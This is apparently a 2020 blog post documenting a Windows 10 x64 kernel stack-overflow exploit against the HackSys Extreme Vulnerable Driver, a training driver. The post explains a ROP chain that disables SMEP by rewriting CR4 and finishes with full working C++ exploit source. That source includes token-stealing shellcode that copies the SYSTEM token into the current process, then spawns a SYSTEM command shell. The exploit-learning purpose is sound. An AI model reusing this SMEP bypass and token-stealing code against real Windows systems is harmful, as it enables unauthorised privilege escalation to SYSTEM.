---
layout: single
title: HEVD Exploits -- Windows 10 x64 Stack Overflow SMEP Bypass
date: 2020-05-04
classes: wide
header:
  teaser: /assets/images/avatar.jpg
tags:
  - Exploit Dev
  - Drivers
  - Windows 10
  - x64
  - Shellcoding
  - SMEP
---

## Introduction
This is going to be my last HEVD blog post. This was all of the exploits I wanted to hit when I started this goal in late January. We did quite a few, there are some definitely interesting ones left on the table and there is all of the Linux exploits as well. I'll speak more about future posts in a future post (haha). I used [Hacksys Extreme Vulnerable Driver 2.0](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver) and Windows 10 Build 14393.rs1_release.160715-1616 for this exploit. Some of the newer Windows 10 builds were bugchecking this technique.

All of the exploit code can be found [here](https://github.com/h0mbre/Windows-Exploits/tree/master/Exploit-Code/HEVD).

## Thanks
- To [@Cneelis](https://twitter.com/Cneelis) for having such great shellcode in his similar exploit on a different Windows 10 build here: https://github.com/Cn33liz/HSEVD-StackOverflowX64/blob/master/HS-StackOverflowX64/HS-StackOverflowX64.c 
- To [@abatchy17](https://twitter.com/abatchy17) for his awesome blog post on his SMEP bypass here: https://www.abatchy.com/2018/01/kernel-exploitation-4
- To [@ihack4falafel](https://twitter.com/ihack4falafel) for helping me figure out where to return to after running my shellcode.

And as this is the last HEVD blog post, thanks to everyone who got me this far. As I've said every post so far, nothing I was doing is my own idea or technique, was simply recreating their exploits (or at least trying to) in order to learn more about the bug classes and learn more about the Windows kernel. (More thoughts on this later in a future blog post). 

## SMEP
We've already completed a Stack Overflow exploit for HEVD on Windows 7 x64 [here](https://h0mbre.github.io/HEVD_Stackoverflow_64bit/); however, the problem is that starting with Windows 8, Microsoft implemented a new mitigation by default called Supervisor Mode Execution Prevention ([SMEP](https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf)). SMEP detects kernel mode code running in userspace stops us from being able to hijack execution in the kernel and send it to our shellcode pointer residing in userspace.

## Bypassing SMEP
Taking my cues from Abatchy, I decided to try and bypass SMEP by using a well-known ROP chain technique that utilizes segments of code in the kernel to disable SMEP and **then** heads to user space to call our shellcode. 

In the linked material above, you see that the `CR4` register is responsible for enforcing this protection and if we look at [Wikipedia](https://en.wikipedia.org/wiki/Control_register#SMEP), we can get a complete breakdown of CR4 and what its responsibilities are:

> 20	SMEP  Supervisor Mode Execution Protection Enable	  If set, execution of code in a higher ring generates a fault.

So the 20th bit of the `CR4` indicates whether or not SMEP is enforced. Since this vulnerability we're attacking gives us the ability to overwrite the stack, we're going to utilize a ROP chain consisting only of kernel space gadgets to disable SMEP by placing a new value in `CR4` and then hit our shellcode in userspace. 

## Getting Kernel Base Address
The first thing we want to do, is to get the base address of the kernel. If we don't get the base address, we can't figure out what the offsets are to our gadgets that we want to use to bypass ASLR. In WinDBG, you can simply run `lm sm` to list all loaded kernel modules alphabetically:
```
---SNIP---
fffff800`10c7b000 fffff800`1149b000   nt
---SNIP---
```

We need a way also to get this address in our exploit code. For this part, I leaned heavily on code I was able to find by doing google searches with some syntax like: `site:github.com NtQuerySystemInformation` and seeing what I could find. Luckily, I was able to find a lot of code that met my needs perfectly. Unfortunately, on Windows 10 in order to use this API your process requires some level of elevation. But, I had already used the API previously and was quite fond of it for giving me so much trouble the first time I used it to get the kernel base address and wanted to use it again but this time in C++ instead of Python. 

Using a lot of the tricks that I learned from @tekwizz123's HEVD exploits, I was able to get the API exported to my exploit code and was able to use it effectively. I won't go too much into the code here, but this is the function and the typedefs it references to retrieve the base address to the kernel for us:
```cpp
typedef struct SYSTEM_MODULE {
    ULONG                Reserved1;
    ULONG                Reserved2;
    ULONG				 Reserved3;
    PVOID                ImageBaseAddress;
    ULONG                ImageSize;
    ULONG                Flags;
    WORD                 Id;
    WORD                 Rank;
    WORD                 LoadCount;
    WORD                 NameOffset;
    CHAR                 Name[256];
}SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
    ULONG                ModulesCount;
    SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemModuleInformation = 0xb
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength
    );

INT64 get_kernel_base() {

    cout << "[>] Getting kernel base address..." << endl;

    //https://github.com/koczkatamas/CVE-2016-0051/blob/master/EoP/Shellcode/Shellcode.cpp
    //also using the same import technique that @tekwizz123 showed us

    PNtQuerySystemInformation NtQuerySystemInformation =
        (PNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"),
            "NtQuerySystemInformation");

    if (!NtQuerySystemInformation) {

        cout << "[!] Failed to get the address of NtQuerySystemInformation." << endl;
        cout << "[!] Last error " << GetLastError() << endl;
        exit(1);
    }

    ULONG len = 0;
    NtQuerySystemInformation(SystemModuleInformation,
        NULL,
        0,
        &len);

    PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)
        VirtualAlloc(NULL,
            len,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE);

    NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation,
        pModuleInfo,
        len,
        &len);

    if (status != (NTSTATUS)0x0) {
        cout << "[!] NtQuerySystemInformation failed!" << endl;
        exit(1);
    }

    PVOID kernelImageBase = pModuleInfo->Modules[0].ImageBaseAddress;

    cout << "[>] ntoskrnl.exe base address: 0x" << hex << kernelImageBase << endl;

    return (INT64)kernelImageBase;
}
```

This code imports `NtQuerySystemInformation` from `nt.dll` and allows us to use it with the `System Module Information` parameter which returns to us a nice struct of a `ModulesCount` (how many kernel modules are loaded) and an array of the `Modules` themselves which have a lot of struct members included a `Name`. In all my research I couldn't find an example where the kernel image wasn't index value `0` so that's what I've implemented here. 

You could use a lot of the cool `string` functions in C++ to easily get the base address of any kernel mode driver as long as you have the name of the `.sys` file. You could cast the `Modules.Name` member to a string and do a substring match routine to locate your desired driver as you iterate through the array and return the base address. So now that we have the base address figured out, we can move on to hunting the gadgets.

## Hunting Gadgets
The value of these gadgets is that they reside in kernel space so SMEP can't interfere here. We can place them directly on the stack and overwrite `rip` so that we are always executing the first gadget and then returning to the stack where our ROP chain resides without ever going into user space. (If you have a preferred method for gadget hunting in the kernel let me know, I tried to script some things up in WinDBG but didn't get very far before I gave up after it was clear it was super inefficient.) Original work on the gadget locations as far as I know is located here: http://blog.ptsecurity.com/2012/09/bypassing-intel-smep-on-windows-8-x64.html

Again, just following along with Abatchy's blog, we can find **Gadget 1** (actually the 2nd in our code) by locating a gadget that allows us to place a value into `cr4` easily and then takes a `ret` soon after. Luckily for us, this gadget exists inside of `nt!HvlEndSystemInterrupt`. 

We can find it in WinDBG with the following:
```
kd> uf HvlEndSystemInterrupt
nt!HvlEndSystemInterrupt:
fffff800`10dc1560 4851            push    rcx
fffff800`10dc1562 50              push    rax
fffff800`10dc1563 52              push    rdx
fffff800`10dc1564 65488b142588610000 mov   rdx,qword ptr gs:[6188h]
fffff800`10dc156d b970000040      mov     ecx,40000070h
fffff800`10dc1572 0fba3200        btr     dword ptr [rdx],0
fffff800`10dc1576 7206            jb      nt!HvlEndSystemInterrupt+0x1e (fffff800`10dc157e)

nt!HvlEndSystemInterrupt+0x18:
fffff800`10dc1578 33c0            xor     eax,eax
fffff800`10dc157a 8bd0            mov     edx,eax
fffff800`10dc157c 0f30            wrmsr

nt!HvlEndSystemInterrupt+0x1e:
fffff800`10dc157e 5a              pop     rdx
fffff800`10dc157f 58              pop     rax
fffff800`10dc1580 59              pop     rcx // Gadget at offset from nt: +0x146580
fffff800`10dc1581 c3              ret
```

As Abatchy did, I've added a comment so you can see the gadget we're after. We want this:

`pop rcx`

`ret`
routine because if we can place an arbitrary value into `rcx`, there is a second gadget which allows us to `mov cr4, rcx` and then we'll have everything we need. 

**Gadget 2** is nested within the `KiEnableXSave` kernel routine as follows (with some snipping) in WinDBG:
```
kd> uf nt!KiEnableXSave
nt!KiEnableXSave:

---SNIP---

nt! ?? ::OKHAJAOM::`string'+0x32fc:
fffff800`1105142c 480fbaf112      btr     rcx,12h
fffff800`11051431 0f22e1          mov     cr4,rcx // Gadget at offset from nt: +0x3D6431
fffff800`11051434 c3              ret
```

So with these two gadgets locations known to us, as in, we know their offsets relative to the kernel base, we can now implement them in our code. So to be clear, our payload that we'll be sending will look like this when we overwrite the stack: 
+ 'A' characters * 2056
+ our `pop rcx` gadget
+ The value we want `rcx` to hold
+ our `mov cr4, rcx` gadget
+ pointer to our shellcode.

So for those following along at home, we will overwrite `rip` with our first gadget, it will pop the first 8 byte value on the stack into `rcx`. What value is that? Well, it's the value that we want `cr4` to hold eventually and we can simply place it onto the stack with our stack overflow. So we will pop that value into `rcx` and then the gadget will hit a `ret` opcode which will send the `rip` to our second gadget which will `mov cr4, rcx` so that `cr4` now holds the SMEP-disabled value we want. The gadget will then hit a `ret` opcode and return `rip` to where? To a pointer to our userland shellcode that it will now run seemlessly because SMEP is disabled. 

You can see this implemented in code here:
```cpp
 BYTE input_buff[2088] = { 0 };

    INT64 pop_rcx_offset = kernel_base + 0x146580; // gadget 1
    cout << "[>] POP RCX gadget located at: 0x" << pop_rcx_offset << endl;
    INT64 rcx_value = 0x70678; // value we want placed in cr4
    INT64 mov_cr4_offset = kernel_base + 0x3D6431; // gadget 2
    cout << "[>] MOV CR4, RCX gadget located at: 0x" << mov_cr4_offset << endl;


    memset(input_buff, '\x41', 2056);
    memcpy(input_buff + 2056, (PINT64)&pop_rcx_offset, 8); // pop rcx
    memcpy(input_buff + 2064, (PINT64)&rcx_value, 8); // disable SMEP value
    memcpy(input_buff + 2072, (PINT64)&mov_cr4_offset, 8); // mov cr4, rcx
    memcpy(input_buff + 2080, (PINT64)&shellcode_addr, 8); // shellcode
```

## CR4 Value
Again, just following along with Abatchy, I'll go ahead and place the value `0x70678` into `cr4`. In binary, `1110000011001111000` which would mean that the 20th bit, the SMEP bit, is set to `0`. You can read more about what values to input here on j00ru's [blog post about SMEP](https://j00ru.vexillium.org/2011/06/smep-what-is-it-and-how-to-beat-it-on-windows/). 

So if `cr4` holds this value, SMEP should be disabled. 

## Restoring Execution
The hardest part of this exploit for me was restoring execution after the shellcode ran. Unfortunately, our exploit overwrites several register values and corrupts our stack quite a bit. When my shellcode is done running (not really **my** shellcode, its borrowed from @Cneelis), this is what my callstack looked like along with my stack memory values:

![](/assets/images/AWE/execution.png)

Restoring execution will always be pretty specific to what version of HEVD you're using and also perhaps what build of Windows you're on as the some of the kernel routines will change, so I won't go too much in depth here. But, what I did to figure out why I kept crashing so much after returning to the address in the screenshot of `HEVD!IrpDeviceIoCtlHandler+0x19f` which is located in the right hand side of the screenshot at `ffff9e8196b99158`, is that `rsi` is typically zero'd out if you send regular sized buffers to the driver routine.

So if you were to send a non-overflowing buffer, and put a breakpoint at `nt!IopSynchronousServiceTail+0x1a0` (which is where `rip` would return if we took a `ret` out our address of `ffff9e8196b99158`), you would see that `rsi` is typically `0` when normally system service routines are exiting so when I returned, I had to have an `rsi` value of `0` in order to stop from getting an exception.

I tried just following the code through until I reached an exception with a non-zero `rsi` but wasn't able to pinpoint exactly where the fault occurs or why. The debug information I got from all my bugchecks didn't bring me any closer to the answer (probably user error). I noticed that if you don't null out `rsi` before returning, `rsi` wouldn't be referenced in any way until a value was popped into it from the stack which happened to be our `IOCTL` code, so this confused me even more. 

Anyways, my hacky way of tracing through normally sized buffers and taking notes of the register values at the same point we return to out of our shellcode did work, but I'm still unsure why 😒. 

## Conclusion
All in all, the ROP chain to disable SMEP via `cr4` wasn't too complicated, this could even serve as introduction to ROP chains for some in my opinion because as far as ROP chains go this is fairly straightforward; however, restoring execution after our shellcode was a nightmare for me. A lot of time wasted by misinterpreting the callstack readouts from WinDBG (a lesson learned). As @ihack4falafel says, make sure you keep an eye on `@rsp` in your memory view in WinDBG anytime you are messing with the stack. 

![](/assets/images/AWE/systemsmep.PNG)

Exploit code [here](https://github.com/h0mbre/Windows-Exploits/blob/master/Exploit-Code/HEVD/x64_StackOverflow_SMEP_Bypass.cpp).

Thanks again to all the bloggers who got me through the HEVD exploits:
+ [FuzzySec](https://twitter.com/FuzzySec)
+ [r0oki7](https://twitter.com/r0otki7)
+ [Tekwizz123](https://twitter.com/tekwizz123)
+ Abatchy
+ everyone else I've referenced in previous posts!

Huge thanks to [HackSysTeam](https://twitter.com/HackSysTeam) for developing the driver for us to all practice on, can't wait to tackle it on Linux!

```cpp
#include <iostream>
#include <string>
#include <Windows.h>

using namespace std;

#define DEVICE_NAME             "\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL                   0x222003

typedef struct SYSTEM_MODULE {
    ULONG                Reserved1;
    ULONG                Reserved2;
    ULONG                Reserved3;
    PVOID                ImageBaseAddress;
    ULONG                ImageSize;
    ULONG                Flags;
    WORD                 Id;
    WORD                 Rank;
    WORD                 LoadCount;
    WORD                 NameOffset;
    CHAR                 Name[256];
}SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
    ULONG                ModulesCount;
    SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemModuleInformation = 0xb
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength
    );

HANDLE grab_handle() {

    HANDLE hFile = CreateFileA(DEVICE_NAME,
        FILE_READ_ACCESS | FILE_WRITE_ACCESS,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        cout << "[!] No handle to HackSysExtremeVulnerableDriver" << endl;
        exit(1);
    }

    cout << "[>] Grabbed handle to HackSysExtremeVulnerableDriver: 0x" << hex
        << (INT64)hFile << endl;

    return hFile;
}

void send_payload(HANDLE hFile, INT64 kernel_base) {

    cout << "[>] Allocating RWX shellcode..." << endl;

    // slightly altered shellcode from 
    // https://github.com/Cn33liz/HSEVD-StackOverflowX64/blob/master/HS-StackOverflowX64/HS-StackOverflowX64.c
    // thank you @Cneelis
    BYTE shellcode[] =
        "\x65\x48\x8B\x14\x25\x88\x01\x00\x00"      // mov rdx, [gs:188h]       ; Get _ETHREAD pointer from KPCR
        "\x4C\x8B\x82\xB8\x00\x00\x00"              // mov r8, [rdx + b8h]      ; _EPROCESS (kd> u PsGetCurrentProcess)
        "\x4D\x8B\x88\xf0\x02\x00\x00"              // mov r9, [r8 + 2f0h]      ; ActiveProcessLinks list head
        "\x49\x8B\x09"                              // mov rcx, [r9]            ; Follow link to first process in list
        //find_system_proc:
        "\x48\x8B\x51\xF8"                          // mov rdx, [rcx - 8]       ; Offset from ActiveProcessLinks to UniqueProcessId
        "\x48\x83\xFA\x04"                          // cmp rdx, 4               ; Process with ID 4 is System process
        "\x74\x05"                                  // jz found_system          ; Found SYSTEM token
        "\x48\x8B\x09"                              // mov rcx, [rcx]           ; Follow _LIST_ENTRY Flink pointer
        "\xEB\xF1"                                  // jmp find_system_proc     ; Loop
        //found_system:
        "\x48\x8B\x41\x68"                          // mov rax, [rcx + 68h]     ; Offset from ActiveProcessLinks to Token
        "\x24\xF0"                                  // and al, 0f0h             ; Clear low 4 bits of _EX_FAST_REF structure
        "\x49\x89\x80\x58\x03\x00\x00"              // mov [r8 + 358h], rax     ; Copy SYSTEM token to current process's token
        "\x48\x83\xC4\x40"                          // add rsp, 040h
        "\x48\x31\xF6"                              // xor rsi, rsi             ; Zeroing out rsi register to avoid Crash
        "\x48\x31\xC0"                              // xor rax, rax             ; NTSTATUS Status = STATUS_SUCCESS
        "\xc3";

    LPVOID shellcode_addr = VirtualAlloc(NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    memcpy(shellcode_addr, shellcode, sizeof(shellcode));

    cout << "[>] Shellcode allocated in userland at: 0x" << (INT64)shellcode_addr
        << endl;

    BYTE input_buff[2088] = { 0 };

    INT64 pop_rcx_offset = kernel_base + 0x146580; // gadget 1
    cout << "[>] POP RCX gadget located at: 0x" << pop_rcx_offset << endl;
    INT64 rcx_value = 0x70678; // value we want placed in cr4
    INT64 mov_cr4_offset = kernel_base + 0x3D6431; // gadget 2
    cout << "[>] MOV CR4, RCX gadget located at: 0x" << mov_cr4_offset << endl;


    memset(input_buff, '\x41', 2056);
    memcpy(input_buff + 2056, (PINT64)&pop_rcx_offset, 8); // pop rcx
    memcpy(input_buff + 2064, (PINT64)&rcx_value, 8); // disable SMEP value
    memcpy(input_buff + 2072, (PINT64)&mov_cr4_offset, 8); // mov cr4, rcx
    memcpy(input_buff + 2080, (PINT64)&shellcode_addr, 8); // shellcode

    // keep this here for testing so you can see what normal buffers do to subsequent routines
    // to learn from for execution restoration
    /*
    BYTE input_buff[2048] = { 0 };
    memset(input_buff, '\x41', 2048);
    */

    cout << "[>] Input buff located at: 0x" << (INT64)&input_buff << endl;

    DWORD bytes_ret = 0x0;

    cout << "[>] Sending payload..." << endl;

    int result = DeviceIoControl(hFile,
        IOCTL,
        input_buff,
        sizeof(input_buff),
        NULL,
        0,
        &bytes_ret,
        NULL);

    if (!result) {
        cout << "[!] DeviceIoControl failed!" << endl;
    }
}

INT64 get_kernel_base() {

    cout << "[>] Getting kernel base address..." << endl;

    //https://github.com/koczkatamas/CVE-2016-0051/blob/master/EoP/Shellcode/Shellcode.cpp
    //also using the same import technique that @tekwizz123 showed us

    PNtQuerySystemInformation NtQuerySystemInformation =
        (PNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"),
            "NtQuerySystemInformation");

    if (!NtQuerySystemInformation) {

        cout << "[!] Failed to get the address of NtQuerySystemInformation." << endl;
        cout << "[!] Last error " << GetLastError() << endl;
        exit(1);
    }

    ULONG len = 0;
    NtQuerySystemInformation(SystemModuleInformation,
        NULL,
        0,
        &len);

    PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)
        VirtualAlloc(NULL,
            len,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE);

    NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation,
        pModuleInfo,
        len,
        &len);

    if (status != (NTSTATUS)0x0) {
        cout << "[!] NtQuerySystemInformation failed!" << endl;
        exit(1);
    }

    PVOID kernelImageBase = pModuleInfo->Modules[0].ImageBaseAddress;

    cout << "[>] ntoskrnl.exe base address: 0x" << hex << kernelImageBase << endl;

    return (INT64)kernelImageBase;
}

void spawn_shell() {

    cout << "[>] Spawning nt authority/system shell..." << endl;

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));

    CreateProcessA("C:\\Windows\\System32\\cmd.exe",
        NULL,
        NULL,
        NULL,
        0,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi);
}

int main() {

    HANDLE hFile = grab_handle();

    INT64 kernel_base = get_kernel_base();
    send_payload(hFile, kernel_base);
    spawn_shell();
}
```
